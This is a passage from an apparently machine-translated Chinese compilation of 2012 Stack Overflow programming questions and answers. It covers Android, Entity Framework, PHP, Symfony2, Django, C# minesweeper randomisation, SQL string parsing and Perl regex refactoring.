04-20 14:39:29.139: E/System(1300):     at android.database.sqlite.SQLiteDatabase$1.entryRemoved(SQLiteDatabase.java:2178)
04-20 14:39:29.139: E/System(1300):     at android.util.LruCache.trimToSize(LruCache.java:197)
04-20 14:39:29.139: E/System(1300):     at android.util.LruCache.evictAll(LruCache.java:285)
04-20 14:39:29.139: E/System(1300):     at android.database.sqlite.SQLiteDatabase.deallocCachedSqlStatements(SQLiteDatabase.java:2143)
04-20 14:39:29.139: E/System(1300):     at android.database.sqlite.SQLiteDatabase.closeClosable(SQLiteDatabase.java:1126)
04-20 14:39:29.139: E/System(1300):     at android.database.sqlite.SQLiteDatabase.finalize(SQLiteDatabase.java:1914)
04-20 14:39:29.139: E/System(1300):     at java.lang.Daemons$FinalizerDaemon.doFinalize(Daemons.java:182)
04-20 14:39:29.139: E/System(1300):     at java.lang.Daemons$FinalizerDaemon.run(Daemons.java:168)
04-20 14:39:29.139: E/System(1300):     at java.lang.Thread.run(Thread.java:856) 
```

帮助！不知道从哪里开始查找错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:48:31.123

`db.setTransactionSuccessful();`你之前忘记了`db.endTransaction();`，`db.execSQL(DatabaseConstants.CREATE_TABLE_CONFERENCES);`所以表不存在......

# android - 使用 HTTP Post Multipart 实体发送视频

> ID：10246451
> 
> 赞同：2
> 
> 时间：2012-04-20T12:41:28.560
> 
> 标签：android, http-post

**我想要什么 我想**将视频从我的 SD 卡发送到服务器。我也想用它发送一些参数/值。

**我试过**我试过下面的代码：

```
public String SendToServer(String aUrl,File aFile)
    {
        HttpClient httpClient = new DefaultHttpClient();
        HttpPost httpPost = new HttpPost(aUrl);

        try 
        {
            MultipartEntity entity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
            entity.addPart("file", new FileBody(aFile));
            entity.addPart("video[title]", new StringBody("testVideo"));
            entity.addPart("video[type]", new StringBody("1"));
            httpPost.setEntity(entity);

            HttpContext localContext = new BasicHttpContext();
            // Bind custom cookie store to the local context
            localContext.setAttribute(ClientContext.COOKIE_STORE, Globals.sessionCookie);

            HttpResponse response = httpClient.execute(httpPost, localContext);
            HttpEntity resEntity = response.getEntity();  
            String Response = "";
            if (response != null) 
            {    
                Response = EntityUtils.toString(resEntity); 
            }
            return Response;
        } 
        catch (IOException e) 
        {
            e.printStackTrace();
        }

        return "Exception";
    } 
```

**问题是什么**当我运行这段代码时，我卡在这一行

```
HttpResponse response = httpClient.execute(httpPost, localContext); 
```

我没有例外，没有任何回应。谁能指导我，这里有什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-02T15:44:48.623

我的问题中的上述代码是完美的，但是我遇到了网络问题。我的设备已连接到热点（Connectify 软件）。当我连接到原始网络时，这段代码运行良好。

我建议你们不要相信热点的这种功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:33:32.283

如果想作为内容或esle发送，请尝试使用这种方式我将在今晚上传项目

```
 HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(url);
        InputStreamEntity reqEntity = new InputStreamEntity(new FileInputStream(filePath), -1);
        reqEntity.setContentType("binary/octet-stream");
        reqEntity.setChunked(true); // Send in multiple parts if needed
        httppost.setEntity(reqEntity);
        HttpResponse response = httpclient.execute(httppost); 
```

# linq - Entity Framework 5（预发布）关于实体关系等的新手问题

> ID：10246455
> 
> 赞同：2
> 
> 时间：2012-04-20T12:41:35.113
> 
> 标签：linq, entity-framework-5

我看了[这个](https://stackoverflow.com/questions/5559043/entity-framework-code-first-two-foreign-keys-from-same-table)SO问题。

我想在 EF 5 中做类似的事情。我没有看到 ForeignKey 属性，而是 EF5 中的 Association 属性。

另外，有人可以解释这是什么/意味着什么：

```
protected override void OnModelCreating(DbModelBuilder modelBuilder)
{
    modelBuilder.Entity<Match>()
                .HasRequired(m => m.HomeTeam)
                .WithMany(t => t.HomeMatches)
                .HasForeignKey(m => m.HomeTeamId)
                .WillCascadeOnDelete(false);

    modelBuilder.Entity<Match>()
                .HasRequired(m => m.GuestTeam)
                .WithMany(t => t.AwayMatches)
                .HasForeignKey(m => m.GuestTeamId)
                .WillCascadeOnDelete(false);
} 
```

这是解释：

> 主键按默认约定映射。球队必须有两个比赛集合。您不能有两个 FK 引用的单个集合。匹配在没有级联删除的情况下进行映射，因为它在这些自引用多对多中不起作用。

我想做的与链接中的示例非常相似，但我不知道：

1.  当我需要修改 DbContext
2.  主键何时相互链接
3.  当我需要显式使用关联来创建关系时

任何解释表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-09T19:58:19.553

好的...我无法回答有关 EF beta 的 ForeignKey 属性问题，因为我还没有机会检查它。

然而...

```
modelBuilder.Entity<Match>() - Take the entity "Match" and perform following operations on it
.HasRequired(m => m.HomeTeam) - The entity needs to have a non-null navigation HomeTeam...
.WithMany(t => t.HomeMatches) - ... which has a subset of Matches by navigation HomeMatches
.HasForeignKey(m => m.HomeTeamId) ... and the associating foreign key is HomeTeamId on Match
.WillCascadeOnDelete(false); ... and don't cascade when the entity is deleted. 
```

这就是 LINQ 的美妙之处，它通常是自记录的。

现在，至于你的三个问题...

1.  仅在更改模型关系或添加/删除实体时修改 DbContext。如果要添加，则需要执行 public DbSet Entities { get; 放; 如果删除等，请删除它。

2.  主键不相互链接。外键链接到主键。按照惯例，如果您有一个 ProjectId、一个名为 Project 的导航对象和另一个名为 Project 且具有名为 Id 的属性的实体，它会自动将 ProjectId 从第一个实体映射到 Project 实体的 Id，并将 Project 实体作为导航项提供给通过 EF 从数据库中获取数据时的第一个实体：

3.  仅当您需要基于非常规的关系时。即，例如，您的主键是“tblId”或“ParentId”而不是“Id”和“ProjectId”。或者您需要对某些项目采取不同类型的行为，例如仅对选定实体进行级联删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T06:11:40.487

在 EF 5 中，如果您使用迁移，则可以更改迁移代码以不实现级联删除：

```
CreateTable(
            "dbo.Match",
            c => new
                {
                    MatchId = c.Long(nullable: false, identity: true),
                    Description = c.String(),
                    HomeTeamId = c.Long(nullable: false),
                 })
            .PrimaryKey(t => t.MatchId)
            .ForeignKey("dbo.Team", t => t.HomeTeamId, cascadeDelete: false)                
            .Index(t => t.MatchId)
            .Index(t => t.HomeTeamId);

    } 
```

或类似的东西。

# php - 用 PHP 重命名文件

> ID：10246456
> 
> 赞同：2
> 
> 时间：2012-04-20T12:41:40.260
> 
> 标签：php, replace, file-handling

我正在使用我在这里找到的代码，效果很好，但是当我尝试访问子目录中的文件时，它就是不想工作。

它获取一个文件，创建一个要写入的临时文件，然后在文件中查找一些文本并用新文本替换该文本，然后保存更新的文件，然后删除临时文件。

以下工作正常：

```
 $reading = fopen('links.htm', 'r');
        $writing = fopen('links.tmp', 'w+');

        $replaced = false;

        while (!feof($reading)) {
          $line = fgets($reading);
          if (stristr($line,'::template::')) {
            $line = "replacement line!\n";
            $replaced = true;
          }
          fputs($writing, $line);
        }
        fclose($reading); fclose($writing);
        // might as well not overwrite the file if we didn't replace anything
        if ($replaced) 
        {
          rename('links.tmp', 'links.htm');
        } else {
          unlink('links.tmp');
        } 
```

这不起作用：

```
 $reading = fopen('path/to/links.htm', 'r');
        $writing = fopen('path/to/links.tmp', 'w+');

        $replaced = false;

        while (!feof($reading)) {
          $line = fgets($reading);
          if (stristr($line,'::template::')) {
            $line = "replacement line!\n";
            $replaced = true;
          }
          fputs($writing, $line);
        }
        fclose($reading); fclose($writing);
        // might as well not overwrite the file if we didn't replace anything
        if ($replaced) 
        {
          rename('path/to/links.tmp', 'path/to/links.htm');
        } else {
          unlink('path/to/links.tmp');
        } 
```

有什么建议么？

这`path`是绝对的，我在之前的代码中定义了它并使用它来创建文件和写入文件，但是当我希望上面的代码以同样的方式工作时，它只是不想这样做。

此外，文件夹权限已设置为写入和读取，这也可以正常工作。

运行子文件夹中的代码并且可以正常工作，但不能从顶级目录运行。

错误报告已关闭，现在将其打开：

> > 该进程无法访问该文件，因为它正被另一个进程使用。（代码：32）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-30T14:59:33.497

因此，经过一周的环顾、测试、破解和重新编码，我找到了一种简单的方法来做到这一点。

由于大部分内容以及 links.htm 文件都是动态创建的，因此很难找到访问文件的位置和时间，因为代码访问了我的大约 300 个客户站点并更新了链接文件。

简单修复：

```
$path = "path/on/server/";

$conn_id = ftp_connect("ftp.testftp.com") or die("Could not connect");
ftp_login($conn_id,"admin","ert456");

$old_file = $path.'links.htm';
$new_file = $path.'_template.htm';
ftp_rename($conn_id, $old_file, $new_file);

$source = fopen($new_file, "w");
$localTarget = "path/to/links.htm";

ftp_fget($conn,$source,$localTarget,FTP_ASCII);

    $reading = fopen('path/to/links.htm', 'r');
    $writing = fopen('path/to/_template.htm', 'w+');

    $replaced = false;

    while (!feof($reading)) {
      $line = fgets($reading);
      if (stristr($line,'::template::')) {
        $line = "replacement line!\n";
        $replaced = true;
      }
      fputs($writing, $line);
    }
    fclose($reading); fclose($writing);
    // might as well not overwrite the file if we didn't replace anything
    if ($replaced) 
    {
      rename('path/to/_template.htm', 'path/to/links.htm');
    } else {
      unlink('path/to/_template.htm');
    }

 $local_file = "path/to/links.htm";

 ftp_put($conn_id, $path, $local_file, FTP_BINARY);

 ftp_close($conn_id); 
```

可能有更简单的方法可以做到这一点，但这对我有用，希望对某人有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:00:48.160

PHP 需要对该目录具有写入权限才能写入该目录。可能是它对当前目录有写权限`.`，但没有对子目录的写权限`./path/to/`。

**编辑：**如果你得到一个 PHP 错误，你应该把它包括在你的问题中。

**OP编辑后编辑：**

该错误意味着当前已`links.htm`打开某些内容。我看到您`fclose()`在重命名文件之前正在读取文件，所以我的猜测是您可能`links.htm`在其他应用程序（例如浏览器或文本编辑器）中打开了文件。

**编辑＃3：**

如果您没有在另一个应用程序中打开`links.htm`或`links.tmp`文件之一，则可能是您使用的是 Windows - 在这种情况下，`rename()`调用将在代码之前执行，`fclose()`即使它在代码中之后也是如此。解决这个问题的方法是`sleep()`在关闭句柄后添加一个调用：

```
fclose($reading); fclose($writing);
sleep(1); // this should allow the handle to be properly closed before the rename() call 
```

# android - Android：如何根据选项卡选择更改 TabActivity 中的 ImageButton

> ID：10246457
> 
> 赞同：1
> 
> 时间：2012-04-20T12:41:48.537
> 
> 标签：android, tabactivity

我有以下 TabActivity

![在此处输入图像描述](../Images/5e607ce5f99573297ec41bc913dd1f8a.png)

现在，当我选择“ SEATE AMT”选项卡时，顶部的ImageButton应该更改为另一个imageButton，并且选择“成员”选项卡时，不应显示按钮。ImageButton 在 TabActivity 中。如何根据选择选项卡动态实现按钮更改？

这是我的 TabActivity ：

```
public class TransactionTab extends TabActivity{
    String groupid="";
    TabHost tb;
    TabSpec tab1,tab2,tab3;
    Intent translist,settleamt,mems;
    Context context = TransactionTab.this;
    ImageButton v_createtrans;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.transactiontab);

        Intent grpintent = getIntent();
        groupid = grpintent.getStringExtra("grpid");

        tb = (TabHost)findViewById(android.R.id.tabhost);
        v_createtrans = (ImageButton)findViewById(R.id.x_createtrans);

        tab1 = tb.newTabSpec("id1");
        tab2 = tb.newTabSpec("id2");
        tab3 = tb.newTabSpec("id3");

        mems = new Intent(context,MemberList.class);
        mems.putExtra("grpid", groupid);
        mems.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);

        translist = new Intent(context,TransactionList.class);
        translist.putExtra("grpid", groupid);
        translist.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);

        settleamt = new Intent(context,SettleAmount.class);
        settleamt.putExtra("grpid", groupid);
        settleamt.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);

        View layview = LayoutInflater.from(context).inflate(R.layout.tab_buttonbg, null);
        Button bt = (Button) layview.findViewById(R.id.tabuton);
        bt.setText("Members");
        tab1.setIndicator(layview);
        tab1.setContent(mems);

        layview = LayoutInflater.from(context).inflate(R.layout.tab_buttonbg, null);
        Button bt1 = (Button) layview.findViewById(R.id.tabuton);
        bt1.setText("Transactions");
        tab2.setIndicator(layview);
        tab2.setContent(translist);

        layview = LayoutInflater.from(context).inflate(R.layout.tab_buttonbg, null);
        Button bt2 = (Button) layview.findViewById(R.id.tabuton);
        bt2.setText("Settle Amt");
        tab3.setIndicator(layview);
        tab3.setContent(settleamt);

        tb.getTabWidget().setDividerDrawable(R.drawable.divider);

        tb.addTab(tab1);
        tb.addTab(tab2);
        tb.addTab(tab3);

        tb.setCurrentTab(1);

        v_createtrans.setOnClickListener(new OnClickListener(){
            public void onClick(View v){
                Intent newtrans = new Intent(context,NewTransaction.class);
                newtrans.putExtra("grpid", groupid);
                startActivity(newtrans);
            }
        });

    } 
```

和布局 xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" 
    android:background="@color/grey_color">

    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="50dp"
        android:background="@color/app_header_color">

        <ImageButton 
            android:id="@+id/x_createtrans"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:src="@drawable/addbtn"
            android:layout_alignParentRight="true"
            android:layout_centerVertical="true"
            android:layout_marginRight="10dp"
            android:background="@null">
        </ImageButton>

    </RelativeLayout>

    <TabHost
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:id="@android:id/tabhost">

        <LinearLayout
         android:layout_width="fill_parent"
         android:layout_height="fill_parent"
         android:orientation="vertical">

            <TabWidget
                android:id="@android:id/tabs"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:background="#ffffff">
            </TabWidget>

            <FrameLayout
                android:layout_height="fill_parent"
                android:layout_width="fill_parent"
                android:id="@android:id/tabcontent">
            </FrameLayout>

        </LinearLayout>

    </TabHost>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:47:40.453

尝试使用

```
 TabHost.SetOnTabChangedListener(this){
 protected void OnTabChanged()
 {

 }
} 
```

# php - 从数组 PHP 生成逗号分隔的字符串列表

> ID：10246458
> 
> 赞同：0
> 
> 时间：2012-04-20T12:41:50.253
> 
> 标签：php, arrays

我正在尝试用 PHP 编写一个函数，但作为一个新手，我发现这样做有点困难。我有一个看起来像的数组

```
[{"x":"12345","y":"john"},{"x":"12345","y":"stars"}] 
```

我正在写的功能是

```
function getCSV($x)
{

    // Now I want to pass the $x which in the above array is 12345 and get "john,stars"  as output
} 
```

PHP中是否有任何可用的方法可以做到这一点，或者获得它的最佳方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:50:25.630

这对我来说看起来像一个json

```
[{"x":"12345","y":"john"},{"uid1":"12345","uid2":"stars"}]

function getCSV($x)
{
    $arr = json_decode($x);
    echo $arr[0]->y . ', ' . $arr[1]->uid2;
} 
```

这看起来很可怕，但没有进一步的解释是唯一有效的方法

编辑 - 编辑后

```
function getCSV($x)
{
    $arr = json_decode($x);
    $y = array();
    foreach($arr as $obj){
        $y[] = $obj->y;
    }
    return implode(',', $y);
} 
```

这是一个工作垫[http://codepad.org/HzttdmjW](http://codepad.org/HzttdmjW)

# symfony - 在 Symfony2 中的控制器操作之外发送电子邮件

> ID：10246460
> 
> 赞同：5
> 
> 时间：2012-04-20T12:42:02.210
> 
> 标签：symfony, fosuserbundle

我正在使用 Symfony2 和 FOSUserBundle

我必须在我的邮件程序类中使用 SwiftMailer 发送电子邮件，这不是控制器或其操作。我正在展示我编码的内容

```
<?php

namespace Blogger\Util;

use Symfony\Bundle\FrameworkBundle\Controller\Controller;

class FlockMailer {

    public function SendEmail(){
        $message = \Swift_Message::newInstance()
        ->setSubject('Hello Email')
        ->setFrom('send@example.com')
        ->setTo('to@example.com')
        ->setBody('testing email');

        $this->get('mailer')->send($message);
    }
} 
```

但我收到以下错误

```
Fatal error: Call to undefined method Blogger\Util\FlockMailer::get() .... 
```

我该如何进行？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-20T13:15:48.023

**编辑**：因为我没有测试代码，如果您不使用服务容器来获取邮件程序的实例，您还应该指定传输层。看：[http ://swiftmailer.org/docs/sending.html](http://swiftmailer.org/docs/sending.html)

你这样做是错的。你基本上想要一个**服务**，而不是一个扩展的类`Controller`。它不起作用，因为服务容器在`SendMail()`功能中不可用。

您必须将服务容器注入您自己的自定义助手中才能发送电子邮件。几个例子：

```
namespace Blogger\Util;

class MailHelper
{
    protected $mailer;

    public function __construct(\Swift_Mailer $mailer)
    {
        $this->mailer = $mailer;
    }

    public function sendEmail($from, $to, $body, $subject = '')
    {
        $message = \Swift_Message::newInstance()
            ->setSubject($subject)
            ->setFrom($from)
            ->setTo($to)
            ->setBody($body);

        $this->mailer->send($message);
    }
} 
```

**要在控制器操作**中使用它：

```
services:
    mail_helper:
        class:     namespace Blogger\Util\MailHelper
        arguments: ['@mailer']

public function sendAction(/* params here */)
{
    $this->get('mail_helper')->sendEmail($from, $to, $body);
} 
```

或其他地方**不访问服务容器**：

```
class WhateverClass
{

    public function whateverFunction()
    {
        $helper = new MailerHelper(new \Swift_Mailer);
        $helper->sendEmail($from, $to, $body);
    }

} 
```

或者在**访问容器**的自定义服务中：

```
namespace Acme\HelloBundle\Service;

class MyService
{
    protected $container;

    public function setContainer($container) { $this->container = $container; }

    public function aFunction()
    {
        $helper = $this->container->get('mail_helper');
        // Send email
    }
}

services:
    my_service:
        class: namespace Acme\HelloBundle\Service\MyService
        calls:
            - [setContainer,   ['@service_container']] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-12T13:59:12.773

只需忘记 setter 和 getter：

```
$transport = \Swift_MailTransport::newInstance();
$mailer = \Swift_Mailer::newInstance($transport);
$helper = new MailHelper($mailer);
$helper->sendEmail($from, $to, $body,$subject); 
```

使用从侦听器方法调用的 MailHelper 对我有用。

# python - Django 中的 PASSWORD_HASHERS 设置

> ID：10246463
> 
> 赞同：11
> 
> 时间：2012-04-20T12:42:25.067
> 
> 标签：python, django

当我尝试通过任何用户错误登录时出现错误

> 未知密码散列算法“sahar”。您是否在 PASSWORD_HASHERS 设置中指定了它？

视图.Py

```
def Login(request):
    state = "Please log in below..."
    username = password = ''
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(username=username, password=password)
        if user is not None:
                if user.is_active:
                    login(request, user)
                    return HttpResponseRedirect('/profile/')
                else:
                    return render_to_response('auth.html',RequestContext(request))

        else:
                return render_to_response('auth.html',RequestContext(request))
    else:
            return render_to_response('auth.html',RequestContext(request) 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-04-20T13:11:57.570

这意味着有一个纯文本`'sahar'`存储为尝试登录的用户的帐户
密码。在 Admin 或 in 中更新用户的密码`manage.py shell`

```
user = User.objects.get(username=username)

# use set_password method
user.set_password('sahar')
user.save()

# INSTEAD OF 
user.password = 'sahar'
user.save() 
```

还要检查您的其他视图以更正`user.password = '...'`和`User.objects.create(password='...')`用法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-12-19T06:40:13.590

**这是保存登录详细信息的最佳方式，您可以从表单创建对象**

```
user = form.save(commit=False) 
```

**然后清理数据以删除在表单字段中输入的任何脚本。**

```
username = form.cleaned_data['username']
password = form.cleaned_data['password']
user.set_password(password)
user.save() 
```

# c# - c# 修改后的 Excel Doc：Ctrl + DownArrow 无法正常工作

> ID：10246474
> 
> 赞同：1
> 
> 时间：2012-04-20T12:42:54.447
> 
> 标签：c#, excel, excel-interop, isnullorempty

伙计们！

在我的 c# 应用程序中创建 Excel 文档后，Ctrl+DownArrow 组合无法正常工作。它转到当前列的最后一行。所以看起来这意味着所有工作表都作为一个数据区域而没有空单元格。

所以我猜我的excel表中的空单元格对于Excel来说不是空的。

如何弄清楚？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:12:14.343

尝试创建您想要发生的事情的宏。然后查看基于互操作调用的宏代码。看看它是否能说明您的问题以及如何解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-02T07:48:27.520

只需过滤掉“空白”Ctrl+向下箭头，所有空白单元格都会被选中，现在按删除（从键盘）。完毕。现在您可以使用 Ctrl+向下箭头在条目之间跳转。

# c# - c#中用于扫雷游戏的非重复随机数

> ID：10246475
> 
> 赞同：2
> 
> 时间：2012-04-20T12:42:56.873
> 
> 标签：c#, .net

我正在用 c# 尺寸（8 x 8）开发扫雷游戏。难度级别增加/减少网格上的地雷数量。

我使用随机类（设置最小值，最大值；）生成随机单元格编号。我面临的问题是，随机对象不断重复相同的编号。我试图通过维护我存储的本地列表来解决这个问题生成的唯一随机数。下次我调用 Next() 时，我会根据本地列表检查它是否已经存在。如果数字已经存在，我会继续调用 Next()，直到我得到一个新号码这是唯一的并且不存在于列表中。但这本身看起来并不是一个好的解决方案，因为有时生成新列表需要花费大量时间。

请对此有任何建议

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:01:00.650

即使您使用相同的随机数生成器，重复值也是可能的。

避免这种情况的一种方法是生成一个可能值的列表，并使用生成的随机数来访问此列表中的值（用作索引）并减少此列表，因为您可以找到放置地雷的位置。

对于 8 X 8 示例，您有 64 个可能的位置

```
 List<int> possibleValues = new List<int>();
 for (int i = 0; i < 64; i++)
 {
     possibleValues[i] = i;
 }

List<int> result = new List<int>();

Random r = new Random();
int numberOfMines = 50; //say you want to put 50 mines there

for (int i = 0; i < numberOfMines; i++)
{
    int indice = r.Next(possibleValues.Count);

    int value = possibleValues[indice];

    possibleValues.Remove(value);
    result.Add(value);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:54:06.083

看起来您想要基于固定数量的单元格 (8,8) 的 shuffle，例如*Fisher* [-Yates shuffle](http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)。这将保证任何坐标只出现一次（而不是重复使用 Random.Next() 可以多次绘制相同的数字），并且坐标的出现顺序是随机的。

初始化一个包含所有单元格坐标的数组，打乱数组并维护下一个“随机”单元格的索引，返回索引偏移处的单元格并增加索引。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T12:55:05.180

与其选择应该有地雷的槽位，不如遍历槽位并计算那里应该有地雷的概率。这个实现变得非常简单，因为你只需要一个循环：

```
bool[] mines = new bool[64];

int cnt = 12;
Random rnd = new Random();
for (int i = 0; i < mines.Length; i++) {
  if (rnd.Next(mines.Length - i) < cnt) {
    mines[i] = true;
    cnt--;
  }
} 
```

`cnt`（改进空间：如果你不需要初始化所有的槽，你可以在达到零时退出循环。）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-20T12:56:40.690

首先计算地雷的数量和空地。

```
Random rand=new Random();
int mines=GetMinesFromDifficulty(...);
int empty=TotalFields-mines; 
```

然后对于每个字段：

```
for(int y=0;y<height;y++)
  for(int x=0;y<height;y++)
  {

    if(random.Next(mines+empty) < mines))
    {
      field[x,y]=Mine;
      mines--;
    }
    else
    {
      field[x,y]=Empty;
      empty--;
    }
  } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T12:54:01.607

如果您的网格是 8x8，并且您想随机选择一个未使用的单元格而不是拉随机数，直到您找到一个未使用的单元格，然后跟踪未使用的单元格的数量。假设 8 个已使用，剩下 55 个未使用。然后生成一个介于 0 和 54 之间的随机数。然后您必须数数，并找到第 n 个空单元格。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-20T12:54:12.047

以更线性的方式考虑问题可能会更容易。而不是说二维数组... Squares[8][8] 将其视为一维数组 Squares[64]。

此时，您为随机地雷放置生成一个介于 0-63 之间的数字。如果说该值为 10，您可以存储以备后用以抵消后续数字。您现在可以将范围从 0-62 缩小，如果您拉出值 16，您希望为您已经在其下方拉出的每个值添加 +1（因此在这种情况下实际使用 17，但正方形 10 已经从我们的集合中排除）。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-04-20T12:54:09.690

在没有看到任何代码的情况下，很难了解事情的要点，但据我所知，您有以下几点：

一个多维数组[8][8] 用于游戏的网格布局，你现在是在尝试随机放置地雷吗？

您需要保留一个 Random 实例来生成数字，否则您将一遍又一遍地获得相同的数字。像这样的东西

```
private readonly Random randomNumber = new Random();

for(int i = 0; i < 10; i++)
{
    Console.WriteLine(this.randomNumber.Next(1, 10));
} 
```

这将生成 10 个随机数，每一个都不同。

# sql - 如何从字符串中获取表达式

> ID：10246480
> 
> 赞同：1
> 
> 时间：2012-04-20T12:43:08.780
> 
> 标签：sql, sql-server, sql-server-2005

这是字符串中的字符串：'(a+b)+(x/y)*1000' 我想得到 '(x/y)' 意思是我希望包含除法的部分稍后检查分母 <> 0 以避免被零除。

字符串公式可能会有所不同，但除法总是在括号之间。

我怎样才能在 sql 中实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:03:30.413

删除直到第二次`(`using的所有内容，`stuff`并将字符带到下一次`)`using `left`。

```
declare @S varchar(20)
set @S = '(1+2)+(3/4)*1000'

select left(S2.S, charindex(')', S2.S)-1)
from (select stuff(@S, 1, charindex('(', @S), '')) as S1(S)
  cross apply (select stuff(S1.S, 1, charindex('(', S1.S), '')) as S2(S) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:11:45.667

您似乎已经拥有的位*（基于您所做的评论）* ...

*   `'/'`=的位置`CHARINDEX('/', yourString)`
*   `')'`=的位置`CHARINDEX(')', yourString, CHARINDEX('/', yourString) + 1)`

的位置`(`有点不同，因为您需要向后搜索。所以你需要反转字符串。所以你还需要改变起始位置。

*   `CHARINDEX('(', REVERSE(yourString), LEN(yourString) - CHARINDEX('/', yourString) + 2)`

从右侧给出位置。 `LEN(yourString) - position + 1`从左侧给出位置。

把这些加在一起，你会得到一个很长的公式......

```
SUBSTRING(
  yourString,
    LEN(yourString)
  - CHARINDEX('(', REVERSE(yourString), LEN(yourString) - CHARINDEX('/', yourString) + 2)
  + 1,
    CHARINDEX(')', yourString, CHARINDEX('/', yourString) + 1)
  - LEN(yourString)
  + CHARINDEX('(', REVERSE(yourString), LEN(yourString) - CHARINDEX('/', yourString) + 2)
  - 1
) 
```

# php - 跨多个文件的正则表达式搜索和替换

> ID：10246488
> 
> 赞同：0
> 
> 时间：2012-04-20T12:43:41.477
> 
> 标签：php, regex, perl, notepad++

我需要跨存储在多个文件夹中的多个 php 文件重构一些代码。

我需要替换代码实例，例如：

```
 trim(ucfirst($userinfo['first_name'])).' '.trim(ucfirst($userinfo['last_name'])) 
```

使用文本（在这些文件中）作为：

```
 formatUserName($userinfo['first_name'],$userinfo['last_name']) 
```

请注意，$ 变量名称会有所不同，但其他所有内容都相同*。

我在一台 Windows 机器上，但安装了 php 和 perl - 宁愿使用它而不是 sed。

我有 Notepad++，但不确定它是否可以处理这样的搜索和替换操作。

*我们的代码中有这一行的变体，一旦我了解了如何构建正确的正则表达式，我将自己尝试。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:01:18.280

使用 Notepad++ 6.0 版，您可以：

找什么 ：`trim\(ucfirst\((\$\w+\['first_name'\])\)\)\.' '\.trim\(ucfirst\((\$\w+\['last_name'\])\)\)`

用。。。来代替： `formatUserName\(\1,\2\)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:59:04.550

我假设您的问题是关于如何处理元字符。这是一种方法。

```
my $find    = q|trim(ucfirst($userinfo['first_name'])).' '.trim(ucfirst($userinfo['last_name']))|;
my $replace = q|formatUserName($userinfo['first_name'],$userinfo['last_name'])|;

while (<>) {
    s/\Q$find\E/$replace/g;
} 
```

`\Q ... \E`将导致正则表达式从字面上匹配其中的内容，尽管变量仍然被插值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T13:03:02.797

未经测试（没有可用的 Windows shell）：

```
perl -i.bak -lpe"BEGIN { $varname = qr/\$[a-z]+/; } s/trim\(ucfirst\(($varname)\['first_name'\]\)\)\.' '\.trim\(ucfirst\(\1\[\'last_name'\]\)\)/formatUserName($1['first_name'],$1['last_name'])/;" file1.php file2.php file3.php … 
```

请注意`\1`匹配部分中的 backref 和`$1`subst 部分中的捕获缓冲区。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T13:08:42.530

***脚本：***

```
$_ = 'trim(ucfirst($userinfo[\'first_name\'])).\' \'.trim(ucfirst($userinfo[\'last_name\']))';
s/^trim\(ucfirst\((\$[^\)]+)\)\)\.'\s+'\.trim\(ucfirst\((\$[^\)]+)\)\)$/formatUserName($1,$2)/; 
print $_; 
```

***输出：***

```
formatUserName($userinfo['first_name'],$userinfo['last_name']) 
```

测试链接：http: [//ideone.com/4e0Bf](http://ideone.com/4e0Bf)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T13:36:36.960

也许最好的方法是使用[`File::Find`](https://metacpan.org/module/File%3a%3aFind)模块来填充`@ARGV`，然后简单地在`while (<>)`循环中进行替换。

这个程序展示了这个想法，但我没有测试过正则表达式，所以要小心。文件的备份副本将另存为`*.php.bak`.

```
use strict;
use warnings;

use File::Find;

our @ARGV = ();

find sub {
  push @ARGV, $File::Find::name if /\.php$/;
}, 'C:\path\to\tree\root';

$^I = '.bak';

while (<>) {
  s<\Qtrim(ucfirst(\E\$(\w+)\Q['first_name'])).' '.trim(ucfirst(\E\$\1\Q['last_name']))\E>
   <formatUserName(\$$1['first_name'],\$$1['last_name'])>g;
  print;
} 
